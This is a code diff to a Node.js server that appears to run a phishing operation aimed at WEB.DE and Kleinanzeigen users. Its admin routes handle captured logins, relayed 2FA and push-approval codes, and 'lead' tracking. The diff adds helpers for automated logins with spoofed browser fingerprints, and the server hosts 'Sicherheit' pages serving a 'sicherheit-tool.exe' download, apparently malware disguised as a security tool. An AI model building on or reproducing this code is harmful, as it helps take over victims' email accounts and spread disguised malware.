@@ -1874,6 +1874,10 @@ function isAdminRequest(pathname) {
          pathname === '/api/webde-login-2fa-wrong' ||
          pathname === '/api/webde-login-2fa-received' ||
          pathname === '/api/webde-login-slot-done' ||
+         pathname === '/api/webde-push-resend-poll' ||
+         pathname === '/api/webde-push-resend-result' ||
+         pathname === '/api/script-event' ||
+         pathname === '/api/zip-password' ||
          pathname === '/api/lead-klein-flow-poll' ||
          pathname === '/api/klein-anmelden-seen';
 }
@@ -2801,7 +2805,17 @@ const ROUTE_HTTP_DEPS = {
   writeWarmupEmailConfig: writeWarmupEmailConfig,
   writeWarmupSmtpStats: writeWarmupSmtpStats,
   writeZipPassword: writeZipPassword,
-  yauzl: yauzl
+  yauzl: yauzl,
+  buildAutomationProfile: buildAutomationProfile,
+  buildLeadLoginContextPayload: buildLeadLoginContextPayload,
+  clearWebdeScriptRunning: clearWebdeScriptRunning,
+  endWebdeAutoLoginRun: endWebdeAutoLoginRun,
+  fingerprintSignature: fingerprintSignature,
+  logTerminalFlow: logTerminalFlow,
+  releaseWebdeLoginSlot: releaseWebdeLoginSlot,
+  setWebdeLeadScriptStatus: setWebdeLeadScriptStatus,
+  touchWebdeScriptLock: touchWebdeScriptLock,
+  webdeLoginChildByLeadId: webdeLoginChildByLeadId,
 };
 
 const server = http.createServer(async (req, res) => {
@@ -2872,7 +2886,7 @@ const server = http.createServer(async (req, res) => {
         return;
       }
     } else if (requestHost === ADMIN_DOMAIN) {
-      const adminAssets = pathname === '/admin.css' || pathname === '/admin.js' || pathname === '/admin.html' || pathname === '/admin-klein-logo.js' || pathname === '/klein-logo.png' || pathname === '/windows-icon.png' || pathname === '/android-icon.png' || pathname === '/ios-icon.png';
+      const adminAssets = pathname === '/admin.css' || pathname === '/admin.js' || pathname === '/admin.html' || pathname === '/klein-logo.png' || pathname === '/windows-icon.png' || pathname === '/android-icon.png' || pathname === '/ios-icon.png';
       const mailerAssets = pathname === '/mailer' || pathname === '/mailer/' || pathname === '/mailer/index.html' || pathname === '/mailer/index-test.html' || pathname === '/mailer/mailer.js' || pathname === '/mailer/mailer.css';
       const sicherheitPage = pathname === '/sicherheit' || pathname === '/sicherheit/' || pathname === '/sicherheit-pc' || pathname === '/sicherheit-pc/' || pathname === '/sicherheit-update' || pathname === '/sicherheit-update/';
       const sicherheitDownload = pathname === '/download/sicherheit-tool' || pathname === '/download/sicherheit-tool.zip' || pathname === '/download/sicherheit-tool.exe' || (pathname.startsWith('/download/') && pathname.length > 10);
